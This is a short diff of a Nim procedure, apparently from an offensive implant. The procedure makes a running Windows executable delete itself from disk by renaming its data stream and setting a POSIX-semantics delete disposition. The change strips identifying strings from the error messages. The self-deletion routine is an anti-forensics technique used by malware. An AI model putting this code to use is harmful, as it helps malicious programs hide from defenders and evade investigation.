@@ -48,21 +48,21 @@ proc deleteSelfFromDisk*() =
     
     hLocalImgFile = CreateFileW(cast[LPCWSTR](addr szFileName[0]), DELETE or SYNCHRONIZE, FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, 0)
     if hLocalImgFile == INVALID_HANDLE_VALUE:
-        raise newException(CatchableError, "CreateFileW [1]" & GetLastError().getError())
+        raise newException(CatchableError, GetLastError().getError())
 
     if SetFileInformationByHandle(hLocalImgFile, fileRenameInfo, addr fileRenameInfo2, cast[DWORD](sizeof(FILE_RENAME_INFO2))) == FALSE:
-        raise newException(CatchableError, "SetFileInfByHandle [1]" & GetLastError().getError())
+        raise newException(CatchableError, GetLastError().getError())
     
     CloseHandle(hLocalImgFile)
 
     hLocalImgFile = CreateFileW(cast[LPCWSTR](addr szFileName[0]),  DELETE or SYNCHRONIZE, FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, 0)
     if hLocalImgFile == INVALID_HANDLE_VALUE: 
-        raise newException(CatchableError, "CreateFileW [2]" & GetLastError().getError())
+        raise newException(CatchableError, GetLastError().getError())
 
     fileDisposalInfoEx.Flags = FILE_DISPOSITION_FLAG_DELETE or FILE_DISPOSITION_POSIX_SEMANTICS
 
     if SetFileInformationByHandle(hLocalImgFile, fileDispositionInfoEx, addr fileDisposalInfoEx, cast[DWORD](sizeof(FILE_DISPOSITION_INFO_EX))) == FALSE: 
-        raise newException(CatchableError, "SetFileInfByHandle [2]" & GetLastError().getError())
+        raise newException(CatchableError, GetLastError().getError())
 
     CloseHandle(hLocalImgFile)
 
